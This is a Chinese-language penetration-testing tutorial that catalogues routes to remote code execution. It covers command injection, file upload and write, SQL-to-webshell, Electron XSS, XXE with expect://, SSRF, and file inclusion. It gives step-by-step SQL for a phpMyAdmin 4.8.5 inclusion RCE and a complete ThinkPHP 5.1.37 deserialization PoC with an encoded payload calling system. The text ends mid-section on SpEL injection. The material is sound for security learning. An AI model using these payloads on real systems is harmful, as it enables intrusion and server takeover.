**作者：ZAC安全  
原文链接：<https://mp.weixin.qq.com/s/gtArMfC2Xq9IEpwvu8Sszg>**

## **00 前言与基础概念**

RCE全称 remote command/code execute
远程代码执行和远程命令执行，那么RCE的作用呢？就相当于我可以在你的电脑中执行任意命令，那么就可以进而使用MSF/CS上线你的主机，就可以完全控制你的电脑了，所以做渗透中，个人认为危害最大的就是RCE，你SQL注入，我有RCE直接连接数据库，你有未授权/信息泄露，我直接查看这些信息，你有XSS，我直接改源码，你有弱口令，我直接扒下来电脑里存储的密码，大多数漏洞能做到的，RCE都可以轻而易举的做到，所以我在做挖洞或代审的时候也更会偏向RCE的挖掘，而我在网上发现RCE的利用方式有很多，并且像是XSS到RCE，XXE到RCE这种小众的利用手段有很多人都不知道，于是就有了此文，也算是自己的一个简单笔记总结文章吧，这篇文章写的我个人认为很全面了几乎涵盖大部分的RCE利用手段了，肯定还有很小众的RCE我没发现，不过全面的坏处就是不够深，都是比较浅的东西，想深入的还是多搜点其他大佬的文章吧

    
    
    基础的shell符号概念
    cmd1 | cmd2 只执行cmd2
    cmd1 || cmd2 只有当cmd1执行失败后，cmd2才被执行
    cmd1 & cmd2 先执行cmd1，不管是否成功，都会执行cmd2
    cmd1 && cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2
    Linux还支持分号（;），cmd1;cmd2按顺序依次执行，先执行cmd1再执行cmd2
    php中也可以用反引号 echo `whoami`;

## **01 exec无过滤拼接RCE**

首先是黑盒，平常我们看到了敏感的参数，比如ping啊，traceroute等测试连通性的，百分之80都基本都有命令拼接（但不一定有RCE），我们以某网关当例子
看到了ping和traceroute，输入127.0.0.1和1

![图片](https://images.seebug.org/content/images/2022/07/11/1657512440000-1usexp.png-w331s)

然后抓包，第一个包，记住这个sessionid，要在第二个包的post中添加过去

![图片](https://images.seebug.org/content/images/2022/07/11/1657512440000-2ntyfl.png-w331s)

第二个包，我们发现参数过滤了

![图片](https://images.seebug.org/content/images/2022/07/11/1657512440000-3roanl.png-w331s)

没有关系，用traceroute试试

![图片](https://images.seebug.org/content/images/2022/07/11/1657512440000-4dxgbw.png-w331s)

可以看到，拼接数据包的时候并没有过滤，这样我们就拿下rce了

![图片](https://images.seebug.org/content/images/2022/07/11/1657512440000-5lhcio.png-w331s)

那要是有源代码的话我们该如何审计呢，这里以某管理平台做例子，call_function参数直接post进来，然后switch判断是ping还是tracert，两边都一样，cmd直接拼接了post的参数，然后exec直接输出

![图片](https://images.seebug.org/content/images/2022/07/11/1657512440000-6jqsuh.png-w331s)

那么直接构造参数就可以造成rce

![图片](https://images.seebug.org/content/images/2022/07/11/1657512441000-7dlrwn.png-w331s)

我们除了exec，还可以全局搜索system，shell_exec等命令函数，原理一样不在赘述，以下为某防火墙的小通杀

![图片](https://images.seebug.org/content/images/2022/07/11/1657512441000-8aigrb.png-w331s)

## **02 任意文件写入**

当然，这些只是单纯的执行命令，在php中还有file_put_contents这种可以写入的函数，例子如下，这是之前bc站的源码，应该是一个小后门,google88990接受传参，然后file_put_contents直接拼接进去，写入文件

![图片](https://images.seebug.org/content/images/2022/07/11/1657512441000-9lwcsc.png-w331s)

直接构造payload

    
    
    xxx/xxx/xxx/xx/xxx/GoogleChartMapMarker.php?google88990=phpinfo();

就可以直接getshell了

## **03 文件上传**

大家用的最最常见的rce方法应该就是文件上传了，这里拿我之前写过的一篇作为案例

这里下载源代码 RiteCMS - download

![图片](https://images.seebug.org/content/images/2022/07/11/1657512441000-10mviig.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512441000-11prncj.png-w331s)

访问 admin.php ， 然后输入默认账密 admin admin ， 再次访问admin.php进入后台

![图片](https://images.seebug.org/content/images/2022/07/11/1657512441000-12qmwhu.png-w331s)

File Manager

![图片](https://images.seebug.org/content/images/2022/07/11/1657512441000-13yaard.png-w331s)

Upload file

![图片](https://images.seebug.org/content/images/2022/07/11/1657512442000-14zahfq.png-w331s)

选择文件

![图片](https://images.seebug.org/content/images/2022/07/11/1657512442000-15lgams.png-w331s)

OK-Upload file

![图片](https://images.seebug.org/content/images/2022/07/11/1657512442000-16nvpvy.png-w331s)

Admin.php 中，进入到 filemanage.inc.php 文件

![图片](https://images.seebug.org/content/images/2022/07/11/1657512442000-17lhyxv.png-w331s)

进入之后看到fileupload函数，这里new一个类，把对象赋值到upload， 然后全局搜索

![图片](https://images.seebug.org/content/images/2022/07/11/1657512443000-18pszyd.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512443000-19rjlsu.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512443000-20ulank.png-w331s)

这里赋值了upload 和uploaddir 参数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512443000-21kfxrv.png-w331s)

继续往下走

![图片](https://images.seebug.org/content/images/2022/07/11/1657512443000-22crnsq.png-w331s)

在 73 行 有 move_uploaded_file 函 数 进 行 上 传 ， 前 面 的

this->uploadDir.directory.’/’

然后回到刚刚的filemanager.inc.php 文件

看到base_path，我们再去全局搜索一下

![图片](https://images.seebug.org/content/images/2022/07/11/1657512444000-23rlzyd.png-w331s)

在settings.php 文件中可以到，返回了绝对路径的上一级目录然后跟踪 directory
参数![图片](https://images.seebug.org/content/images/2022/07/11/1657512444000-24apitf.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512444000-25fiubz.png-w331s)

这里的目录是不固定的，如果判断为true，则是/files，如果为 false， 则 是 /media

然后继续往下走

![图片](https://images.seebug.org/content/images/2022/07/11/1657512444000-26kqffq.png-w331s)

如果为false进入else语句，调用savefile函数

这里的filename和file_name是一样的

![图片](https://images.seebug.org/content/images/2022/07/11/1657512444000-27pikdr.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512444000-28cldhb.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512444000-29doyqx.png-w331s)

该函数直接用 copy 函数将临时文件复制到后面的文件中，成功拿下rce

![图片](https://images.seebug.org/content/images/2022/07/11/1657512445000-30jifsx.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512445000-31bksyv.png-w331s)

这是copy 函数中的参数来源

## **04 任意登录后台+后台RCE**

当然，有的时候可能会进行鉴权，比如只有在后台的时候才可以使用xx 方法，xx 功能，那么我们要配合信息泄露或者未授权进行组合combo，如下

我们可以看到，在shell_exec前会判断是否登录了

![图片](https://images.seebug.org/content/images/2022/07/11/1657512445000-32hjjim.png-w331s)

那么我们只要有方法不需要实际的账号密码可以进入后台，那么就是个前台rce，如下，只需要密码为 hassmedia 就可以成功的进入后台

![图片](https://images.seebug.org/content/images/2022/07/11/1657512445000-33gzzrn.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512445000-34ajgqk.png-w331s)

## **05 SQL语句执行+写入权限+绝对路径**

还有一种常见的拿shell手段是利用sql语句，如下

某次渗透过程中扫描到了一个3.txt文件

![图片](https://images.seebug.org/content/images/2022/07/11/1657512446000-35ireon.png-w331s)

可以看到有了绝对路径，那么我们现在就是需要找到sql注入点或者能执行sql的方法，访问phpmyadmin的时候直接进去了

![图片](https://images.seebug.org/content/images/2022/07/11/1657512446000-36dnzjb.png-w331s)

权限有了，执行点有了，绝对路径也有了，接下来就是常规的写shell

![图片](https://images.seebug.org/content/images/2022/07/11/1657512446000-37ylzfk.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512446000-38geijd.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512447000-39zpqee.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512447000-40ttxtp.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512447000-41rzvyb.png-w331s)

原理就不赘述了，把两个重要语句贴下面了

![图片](https://images.seebug.org/content/images/2022/07/11/1657512447000-42nidaf.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512448000-43dgsjo.png-w331s)

当然，如果是sqlserver可以直接用xp_cmdshell

![图片](https://images.seebug.org/content/images/2022/07/11/1657512448000-44qolmh.png-w331s)

## **06 XSS+electron**

Sql到rce都有了，那么为何不试试xss到rce呢？先安装好node.js和electron

![图片](https://images.seebug.org/content/images/2022/07/11/1657512448000-45ygnre.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512448000-46mcbta.png-w331s)

使用npm下载的话会比较慢，这里可以用另一种方法

    
    
    npm install -g cnpm --registry=https://registry.npm.taobao.org
    cnpm install electron -g

![图片](https://images.seebug.org/content/images/2022/07/11/1657512449000-47sohty.png-w331s)

成功安装，然后开始搭建环境

![图片](https://images.seebug.org/content/images/2022/07/11/1657512449000-48jykct.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512449000-49thfec.png-w331s)

三个文件搭建好，然后npm run start就可以了

![图片](https://images.seebug.org/content/images/2022/07/11/1657512450000-50swvms.png-w331s)

那么如何利用这个去rce呢，简单的一句话，在index.js中如下

    
    
    const exec = require('child_process').exec
    exec('calc.exe',(err, stdout, stderr) => console.log(stdout))

下图可以看到成功弹出计算器，造成rce，那么我们在能xss的情况下，控制前端代码，并且是electron框架的时候，即可造成rce

![图片](https://images.seebug.org/content/images/2022/07/11/1657512450000-51jkjhm.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512450000-52rttlc.png-w331s)

大家所熟知的xss到rce应该就是某剑了，不过因为已经有很多大哥都写过文章了，这里就不在赘述了，感兴趣的可以去查一查，除了某剑还有某by也曾爆出过rce

https://evoa.me/archives/3/#%E8%9A%81%E5%89%91%E5%AE%A2%E6%88%B7%E7%AB%AFRCE%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B%E5%8F%8AElectron%E5%AE%89%E5%85%A8

如果使用shell.openExternal那段，命令里面只能使用file打开，或者打开网站，可利用性太小

![图片](https://images.seebug.org/content/images/2022/07/11/1657512450000-53qmrwb.png-w331s)

打开个计算器还是没啥问题的

![图片](https://images.seebug.org/content/images/2022/07/11/1657512451000-54qmrqi.png-w331s)

顺便说一下，网上很多都是用child_process，然后export
function，但是我实测后发现并不能复现不了，各位师傅可以去看看，最简化版应该就是以下这两行了

    
    
    const exec = require('child_process').exec
    exec('calc.exe')

![图片](https://images.seebug.org/content/images/2022/07/11/1657512451000-55egtej.png-w331s)

## **07 XXE+php协议**

除了xss还有一种就是xxe到rce，这里为了方便就不在本地搭环境了，随便网上找了个靶场去打，可以看到数据是由xml进行传输的，那么我们只要注入恶意payload即可造成xxe攻击

![图片](https://images.seebug.org/content/images/2022/07/11/1657512451000-56bvdja.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512451000-57rdcqi.png-w331s)

但这种情况下，只能造成任意文件读取，xxe跟xss一样，都需要特定的环境才可以造成rce，比如说配合php的协议，expect等

![图片](https://images.seebug.org/content/images/2022/07/11/1657512452000-58sngyq.png-w331s)

那么我们的语句就可以变成

    
    
    <!ENTITY xxe SYSTEM "expect://id" >]>

也就造成了rce（懒得配环境了，感兴趣的可自行测试）

## **08 SSRF+远程文件下载**

还有一种rce的方式，是利用ssrf配合远程文件下载造成的rce，如下，搭建好网站

![图片](https://images.seebug.org/content/images/2022/07/11/1657512452000-59mgnfe.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512452000-60qmase.png-w331s)

分析代码，我们可以看到函数downloadImage中，有个readfile，此处无过滤，这里就是一个简单的ssrf，但是在769行还有一个imageStream

![图片](https://images.seebug.org/content/images/2022/07/11/1657512452000-61pvojo.png-w331s)

我们跟进来发现其中有个file_put_contents，可以直接造成远程文件下载后写入

![图片](https://images.seebug.org/content/images/2022/07/11/1657512452000-62ryrdv.png-w331s)

有了逻辑我们就可以简单的构造数据包如下：

![图片](https://images.seebug.org/content/images/2022/07/11/1657512453000-63glcsu.png-w331s)

成功写入

![图片](https://images.seebug.org/content/images/2022/07/11/1657512453000-64tpoyw.png-w331s)

## **09 文件包含**

（组合拳0day分析与phpmyadmin分析）

我们再换一种思路，尝试利用文件包含组合拳getshell，以下用某设备的0day做示例

全局搜索include，发现一处可控的文件包含，这是直接post进来的

![图片](https://images.seebug.org/content/images/2022/07/11/1657512453000-65wrewb.png-w331s)

然后再次全局搜索file_put_contents，看看哪里可以写入，在set_authAction中找到了如下利用点，userName可控，fileCntent可控，filename直接拼接userName

![图片](https://images.seebug.org/content/images/2022/07/11/1657512453000-66sanfe.png-w331s)

那么AUTH_DIR和DS呢？这两个参数在最开始的时候已经定义了，DS为分隔符，然后AUTH_DIR拼接

![图片](https://images.seebug.org/content/images/2022/07/11/1657512453000-67wxebg.png-w331s)

但文件包含仅限于/tmp/app_auth/cfile/，我们需要找到一个能创建目录的利用点，全局搜索mkdir，发现dir可控，shell直接创建了，那么整个漏洞逻辑就出来了

![图片](https://images.seebug.org/content/images/2022/07/11/1657512454000-68ljdpo.png-w331s)

先逐级创建目录

    
    
    Post创建目录 store=/tmp/app_auth&isdisk=1
    Post创建目录  store=/tmp/app_auth/cfile&isdisk=1
    post写入文件数据 serName=../../tmp/app_auth/cfile/sb&auth=<?php phpinfo(); ?>
    Post数据包含 cf=sb.txt

成功getshell

![图片](https://images.seebug.org/content/images/2022/07/11/1657512454000-69ecuet.png-w331s)

以上是文件包含+txt文件任意写入+目录创建的组合拳

还有一个是最近爆出来的0day，phpmyadmin文件包含后台RCE，不过现在应该打了补丁，但是分析文章还没出来，算是1day吧

复现步骤

1.

    
    
    CREATE DATABASE test; CREATE TABLE test.bar ( baz VARCHAR(100) PRIMARY KEY ); INSERT INTO test.bar SELECT '<?php phpinfo(); ?>';

![图片](https://images.seebug.org/content/images/2022/07/11/1657512454000-70aipom.png-w331s)

2.然后点test库，再执行sql

    
    
    CREATE TABLE pma__userconfig ( id int(11) NOT NULL, id2 int(11) NOT NULL, config_data text NOT NULL, timevalue date NOT NULL, username char(50) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=latin1;

![图片](https://images.seebug.org/content/images/2022/07/11/1657512454000-71lpkcn.png-w331s)

3.

    
    
    INSERT INTO pma__userconfig (id, id2, config_data, timevalue, username) VALUES (1, 2,'{\"DefaultTabDatabase\":\"..\/..\/Extensions\/tmp\/tmp\/sess_inhi60cjt8rojfmjl71jjo6npl\",\"lang\":\"zh_CN\",\"Console\/Mode\":\"collapse\"}','2022-05-07', 'root');

![图片](https://images.seebug.org/content/images/2022/07/11/1657512454000-72wxxjv.png-w331s)

删除cookie

![图片](https://images.seebug.org/content/images/2022/07/11/1657512455000-73eetwb.png-w331s)

访问主页登录进去

![图片](https://images.seebug.org/content/images/2022/07/11/1657512455000-74hzzxw.png-w331s)

登录进来之后访问两次

http://localhost/phpmyadmin4.8.5/index.php?db=test

成功RCE

![图片](https://images.seebug.org/content/images/2022/07/11/1657512455000-75jbafx.png-w331s)

下面就是代审环节：

入口点

index.php中用了Config文件

![图片](https://images.seebug.org/content/images/2022/07/11/1657512455000-76bwjpg.png-w331s)

Config.php文件中使用了require 包含了common.inc.php文件

![图片](https://images.seebug.org/content/images/2022/07/11/1657512455000-77dyydc.png-w331s)

在lib/common.inc.php中我们可以看到又包含了另一个目录的common.inc.php

![图片](https://images.seebug.org/content/images/2022/07/11/1657512456000-78ckkwg.png-w331s)

跟进去我们可以看到453行代码

![图片](https://images.seebug.org/content/images/2022/07/11/1657512456000-79ltcnl.png-w331s)

这里有一个loadUserPreferences函数，是用来加载用户数据库里面的内容，全局搜索找到该函数位置

第972行使用了load函数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512456000-80bwkda.png-w331s)

跟进来

![图片](https://images.seebug.org/content/images/2022/07/11/1657512457000-81aboas.png-w331s)

前面的入口流程就这么多，接下来就是核心分析，打上断点动态debug调试

![图片](https://images.seebug.org/content/images/2022/07/11/1657512457000-82ygfep.png-w331s)

我们可以看到第一行有getRelationsParam，f7跟进去，我们可以看到该函数是读取sessions的一些数据，如下

![图片](https://images.seebug.org/content/images/2022/07/11/1657512457000-83opbay.png-w331s)

然后return回来

![图片](https://images.seebug.org/content/images/2022/07/11/1657512458000-84kyqca.png-w331s)

然后跟下来是backquote函数，f7进去

![图片](https://images.seebug.org/content/images/2022/07/11/1657512458000-85brmrx.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512458000-85brmrx.png-w331s)

进行拼接test和pma__userconfig

![图片](https://images.seebug.org/content/images/2022/07/11/1657512458000-87xnnte.png-w331s)

然后就往下走到88-92进行拼接sql语句

![图片](https://images.seebug.org/content/images/2022/07/11/1657512459000-88xzbog.png-w331s)

然后就是93行的fetchSingleRow函数，继续跟进来

这里的config_data获取到了路径

![图片](https://images.seebug.org/content/images/2022/07/11/1657512459000-89dibgl.png-w331s)

return回来

![图片](https://images.seebug.org/content/images/2022/07/11/1657512460000-90wakft.png-w331s)

然后会对config_data表进行json_decode处理

这里会进入一个readConfig函数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512460000-91qthfx.png-w331s)

然后跳过一些意义不大的函数

到这里会给prefs一个赋值

![图片](https://images.seebug.org/content/images/2022/07/11/1657512460000-92ozpoz.png-w331s)

然后就是给config_data赋值

![图片](https://images.seebug.org/content/images/2022/07/11/1657512460000-93szbla.png-w331s)

路径就传过来了

953行会global一个cfg，并传过来config_data

![图片](https://images.seebug.org/content/images/2022/07/11/1657512461000-94jrril.png-w331s)

这里就是我们的漏洞点了，如下

![图片](https://images.seebug.org/content/images/2022/07/11/1657512461000-95acvte.png-w331s)

我们跟进Util中的getScriptNameForOption函数，如下

![图片](https://images.seebug.org/content/images/2022/07/11/1657512461000-96qyxca.png-w331s)

Location是database不是server，于是跳过该条件判断，并且注意此时带过来的target是我们的sessions路径

![图片](https://images.seebug.org/content/images/2022/07/11/1657512462000-97rsyxw.png-w331s)

此时可以看到switch中没有能跟路径匹配的

于是原路返回我们的target

![图片](https://images.seebug.org/content/images/2022/07/11/1657512462000-98rnfrm.png-w331s)

进行包含

![图片](https://images.seebug.org/content/images/2022/07/11/1657512462000-99rkymq.png-w331s)

成功RCE

![图片](https://images.seebug.org/content/images/2022/07/11/1657512463000-100lhomf.png-w331s)

## **10 反序列化RCE**

接着我们来分析难度较高的反序列化+RCE，因为目前反序列化的文章并不是很多，所以这里先说一下基础概念

![图片](https://images.seebug.org/content/images/2022/07/11/1657512463000-101wbkvo.png-w331s)

先来看一下这段代码，基本的注释我已经在上面写好了，大家过一下就行，现在说一下几个点

1.输出的变量zactest为什么变成了zaczactest？

这是因为定义$zactest的时候用的是private方法，我们看下面这段话

private是私有权限，他只能用在zac类中，但是在序列化后呢，为了表明这个是我独有的，他就必须要在定义的变量之前加上自己的类名

![图片](https://images.seebug.org/content/images/2022/07/11/1657512463000-102hcych.png-w331s)

2.zaczactest明明是10个字符，为什么显示12个？

![图片](https://images.seebug.org/content/images/2022/07/11/1657512463000-103fipbn.png-w331s)

这是因为私有化属性序列化的格式是%00类名%00属性名，类名就是zac，属性名就是zactest，在这当中分别插入两个%00，所以就多出了两个字符，但为啥没显示出来呢？这是因为%00是空白符

![图片](https://images.seebug.org/content/images/2022/07/11/1657512464000-104zhuze.png-w331s)

3.为什么zac变量前要加上一个*，并且字符数是6

![图片](https://images.seebug.org/content/images/2022/07/11/1657512464000-105kmxvu.png-w331s)

这个同理2，因为是protected方法赋值的$zac，所以它也有相应的格式，protected格式为%00
_%00属性名，这也是为什么zac变量前面要加上一个_ ，并且字符数是6的原因了

4.那除了这两个方法，public有什么特性呢？

前面俩兄弟都有相应的序列化格式，但是public没有，该是多少就是多少，他的特性就是public是公有化的，所以public赋值的变量可以在任何地方被访问

然后就是实例复现，安装thinkphp5.1.37，然后将framework改名为thinkphp放到,tp5.1.37的目录里

https://github.com/top-think/framework/releases/tag/v5.1.37

https://github.com/top-think/think/releases/tag/v5.1.37

因为我对反序列化也不是特别熟悉，所以以下基本完全参照该文章

https://www.cnblogs.com/xueweihan/p/11931096.html

不过稍微修改了一些，比如过程中的一些方法，还有最后的动态审计部分，并且这篇文章中的poc我也是没复现成功，最后找到其他大佬发出来的poc复现成功的（如侵权私聊我）

![图片](https://images.seebug.org/content/images/2022/07/11/1657512464000-106tbxcs.png-w331s)

全局搜索_destruct

![图片](https://images.seebug.org/content/images/2022/07/11/1657512464000-107jvfuw.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512465000-108feawn.png-w331s)

可以看到desturct有一个removeFiles，跟进

![图片](https://images.seebug.org/content/images/2022/07/11/1657512465000-109qeudt.png-w331s)

我们可以看到其中有一个file_exists，那么当filename是一个对象的时候，就会调用toString

![图片](https://images.seebug.org/content/images/2022/07/11/1657512465000-110hqxbg.png-w331s)

全局搜索toString

![图片](https://images.seebug.org/content/images/2022/07/11/1657512465000-111xgzlc.png-w331s)

发现toString里面只有个toJson，继续跟进

![图片](https://images.seebug.org/content/images/2022/07/11/1657512466000-112jflwb.png-w331s)

发现有个toArray，跟进去

![图片](https://images.seebug.org/content/images/2022/07/11/1657512466000-113ypmlr.png-w331s)

往下翻，看到这几行代码，$this->append的键名是key，name可控

![图片](https://images.seebug.org/content/images/2022/07/11/1657512466000-114zucnf.png-w331s)

那么188行的realtion呢？跟进getRelation试试

![图片](https://images.seebug.org/content/images/2022/07/11/1657512466000-115vxkia.png-w331s)

我们可以看到在toArray函数中的第201行，判断!relation，那么想进来这个if里，就要让this->relation

![图片](https://images.seebug.org/content/images/2022/07/11/1657512467000-116nkvnu.png-w331s)

跟下去getAttr

![图片](https://images.seebug.org/content/images/2022/07/11/1657512467000-117xtaml.png-w331s)

跟进getData

![图片](https://images.seebug.org/content/images/2022/07/11/1657512467000-118dvbmp.png-w331s)

我们只需要让key 这个键，然后让getAttr() 函数486行下面的if 判断都没有，就可以直接使 this->data[$key] ;

那么key 也是可控的(relation 也是可控的

我们接着全局搜索__call

![图片](https://images.seebug.org/content/images/2022/07/11/1657512468000-119yaufk.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512468000-120gwrey.png-w331s)

看到了call_user_func_array，发现我们可以完全控制住第一个参数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512468000-121yvbtk.png-w331s)

那么我们现在就需要找到这类函数，比如input

![图片](https://images.seebug.org/content/images/2022/07/11/1657512468000-122ziosj.png-w331s)

但这里我们只能去找间接调用input的方法，全局搜索$this->input，找到param函数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512469000-123irdif.png-w331s)

我们在当前目录搜索哪里调用了param这个函数，看到了isAjax

![图片](https://images.seebug.org/content/images/2022/07/11/1657512469000-124rmydu.png-w331s)

然后开始进行漏洞复现，首先在

\application\index\controller\Index.php

文件添加一个反序列化入口

![图片](https://images.seebug.org/content/images/2022/07/11/1657512469000-125vdsxx.png-w331s)

然后我们构建一个payload

![图片](https://images.seebug.org/content/images/2022/07/11/1657512470000-126pdhsx.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512470000-127jntlp.png-w331s)

    
    
    <?php
    namespace think;
    abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
    $this->append = ["ethan"=>["dir","calc"]];
    $this->data = ["ethan"=>new Request()];
    }
    }
    class Request
    {
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
    // 表单请求类型伪装变量
    'var_method'     => '_method',
    // 表单ajax伪装变量
    'var_ajax'       => '_ajax',
    // 表单pjax伪装变量
    'var_pjax'       => '_pjax',
    // PATHINFO变量名 用于兼容模式
    'var_pathinfo'   => 's',
    // 兼容PATH_INFO获取
    'pathinfo_fetch' => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
    // 默认全局过滤方法 用逗号分隔多个
    'default_filter' => '',
    // 域名根，如thinkphp.cn
    'url_domain_root'=> '',
    // HTTPS代理标识
    'https_agent_name'=> '',
    // IP代理获取标识
    'http_agent_ip'  => 'HTTP_X_REAL_IP',
    // URL伪静态后缀
    'url_html_suffix'=> 'html',
    ];
    function __construct(){
    $this->filter = "system";
    $this->config = ["var_ajax"=>''];
    $this->hook = ["visible"=>[$this,"isAjax"]];
    }
    }
    namespace think\process\pipes;
    use think\model\concern\Conversion;
    use think\model\Pivot;
    
    class Windows
    {
    private $files = [];
    public function __construct()
    {
    $this->files=[new Pivot()];
    }
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    use think\process\pipes\Windows;
    echo base64_encode(serialize(new Windows()));
    /*input=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami*/
    ?>

然后php 2.php 生成payload，在id里加个whoami

![图片](https://images.seebug.org/content/images/2022/07/11/1657512470000-128vxydi.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512470000-129loabe.png-w331s)

成功拿下rce

因为这个反序列化网上教程都是静态硬审的，所以非常不好理解，为了便于理解，我们可以使用xdebug配合phpstorm进行动态调试，更好地理解参数传递的过程

Php.ini文件：

![图片](https://images.seebug.org/content/images/2022/07/11/1657512471000-130rbzsk.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512471000-131ziqpi.png-w331s)

然后开启监听，burp打上payload开始跟

![图片](https://images.seebug.org/content/images/2022/07/11/1657512471000-132tkwdg.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512471000-133bxcha.png-w331s)

入口进来

![图片](https://images.seebug.org/content/images/2022/07/11/1657512472000-134skbdn.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512472000-135lxmxo.png-w331s)

然后param函数，获取到了一些方法之类的参数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512472000-136iyzeq.png-w331s)

跟到input

![图片](https://images.seebug.org/content/images/2022/07/11/1657512472000-137fnuns.png-w331s)

getFilter

![图片](https://images.seebug.org/content/images/2022/07/11/1657512473000-138bklrc.png-w331s)

反序列化入口点

![图片](https://images.seebug.org/content/images/2022/07/11/1657512473000-139rbxdj.png-w331s)

调用__destruct

![图片](https://images.seebug.org/content/images/2022/07/11/1657512473000-140iojdv.png-w331s)

removeFiles

![图片](https://images.seebug.org/content/images/2022/07/11/1657512473000-141ibcxu.png-w331s)

调用了toString

![图片](https://images.seebug.org/content/images/2022/07/11/1657512474000-142nfkan.png-w331s)

然后跟进tojson

![图片](https://images.seebug.org/content/images/2022/07/11/1657512474000-143lluty.png-w331s)

继续跟进toArray

![图片](https://images.seebug.org/content/images/2022/07/11/1657512474000-144lypsb.png-w331s)

然后就是getAttr

![图片](https://images.seebug.org/content/images/2022/07/11/1657512474000-145rznyd.png-w331s)

getData

![图片](https://images.seebug.org/content/images/2022/07/11/1657512474000-146zpkec.png-w331s)

getRelation

![图片](https://images.seebug.org/content/images/2022/07/11/1657512474000-147ybatf.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512474000-148socbg.png-w331s)

然后跳过几个无用步骤，进到了call

![图片](https://images.seebug.org/content/images/2022/07/11/1657512475000-149ccaqs.png-w331s)

isAjax

![图片](https://images.seebug.org/content/images/2022/07/11/1657512475000-150csywp.png-w331s)

然后再跳到param

![图片](https://images.seebug.org/content/images/2022/07/11/1657512476000-151wwrvn.png-w331s)

然后再跳几下，就到了appShutdown结束

![图片](https://images.seebug.org/content/images/2022/07/11/1657512476000-152njfdj.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512476000-153pxkdw.png-w331s)

这就是一个大致的流程，理论还是按照静态审的来，也可以动态自己跟着走一遍可以理解（这里用的都是f8，如果要跟的更加深入一点可以f7进入每个方法的模块一点点看，我这里跳步比较多，所以还是推荐自己去跟一下深入理解）

Php说了这么多，那么再来稍微说下java，因为我java学的并不是很多，所以这里只是简单写几个案例，先来说一下java和php不同的地方，php中的exec，就相当于正常的cmd了，但是在java中却不一样，如下，单纯一个whoami可以正常执行

![图片](https://images.seebug.org/content/images/2022/07/11/1657512477000-154xlfki.png-w331s)

但是当我们用管道符拼接的时候发现，报错了，这是因为Runtime.getRuntime().exec将里面的参数当成一个完整的字符串了，而不是管道符分割的两个命令，那么也就不能像php一样进行拼接rce了，这也是体现java安全性高的一点（当然如果开发直接把参数代入了也是可以的，但是我没找到这样的java案例，这里有个坑点，记得加exec.waitFor，不然执行不成功的，也可能单纯是我环境的问题）

![图片](https://images.seebug.org/content/images/2022/07/11/1657512477000-155qxfgv.png-w331s)

但是用cmd /c是可以的，不过如果开发写的是ping 加参数依旧是不能直接拼接的，必须command全部参数都可控才行

![图片](https://images.seebug.org/content/images/2022/07/11/1657512477000-156gcjmr.png-w331s)

## **11 表达式注入**

然后就是java的表达式注入，这里用最近的Spring Cloud
Function的spel表达式注入做测试（因为好找靶场，本地环境一直搭不起来）（除了spel还有OGNL,MVEL,EL等，这里只用spel举例做测试）

先看一个简单的demo，这里我们发现12行的expression代入到了13行的parseExpression中，可以解析java.lang.Runtime类，那么我们就可以直接执行命令

